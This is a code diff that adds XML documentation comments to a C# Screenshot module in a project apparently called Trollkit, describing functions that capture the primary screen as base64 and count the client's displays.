@@ -17,9 +17,12 @@ namespace Trollkit_Library.Modules
 		[DllImport("user32.dll")]
 		public static extern bool EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);
 
-
 		private Screenshot() { }
 
+		/// <summary>
+		/// Returns a base64 string of the screenshot
+		/// </summary>
+		/// <returns></returns>
 		public static string MakeScreenshot()
 		{
 			Screen screen = Screen.PrimaryScreen;
@@ -36,12 +39,18 @@ namespace Trollkit_Library.Modules
 			}
 		}
 
+		/// <summary>
+		/// Returns the amount of screens on the client
+		/// </summary>
+		/// <returns></returns>
 		public static int GetScreenCount()
 		{
 			return Screen.AllScreens.Length;
 		}
 
-
+		/// <summary>
+		/// Taken from pInvoke website, required for requesting screen parameters
+		/// </summary>
 		[StructLayout(LayoutKind.Sequential)]
 		public struct DEVMODE
 		{
